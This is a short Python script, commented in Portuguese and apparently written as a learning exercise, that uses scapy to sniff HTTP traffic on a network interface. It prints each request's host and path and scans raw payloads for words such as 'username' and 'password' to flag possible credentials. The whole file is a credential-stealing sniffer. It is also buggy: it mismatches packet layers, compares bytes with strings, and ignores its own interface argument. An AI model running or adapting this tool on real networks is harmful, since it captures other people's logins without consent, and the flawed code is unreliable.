import argparse
import scapy.all as scapy

# Quero pegar apenas pacotes http (opcional)
from scapy.layers import http

def pegar_argumentos():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Define qual a interface para ser monitorada")
    argumentos = parser.parse_args()
    return argumentos.interface

def sniff(iface):
    # Interface, não armazenar resultado do pacote, prn para definir o que acontecer ao interceptar o pacote
    scapy.sniff(iface=iface, store=False,prn=processar_pacote)

def processar_pacote(pacote):
    # Podria definir apenas HTTP com http.HTTPRequest
    if pacote.haslayer(scapy.IP):
        print("Requisição HTTP " + pacote[http.HTTPRequest].Host + pacote[http.HTTPRequest].Path)
        # Pegar apenas o que me importa (nome, senha por exemplo)
        if pacote.haslayer(scapy.Raw):
            load = pacote[scapy.Raw].load
            chaves = ["username", "password", "pass", "email"]
            for chave in chaves:
                if chave in load:
                    print("Possivel senha ou usuário" + load)
                    break



iface = pegar_argumentos()
sniff("Wi-Fi")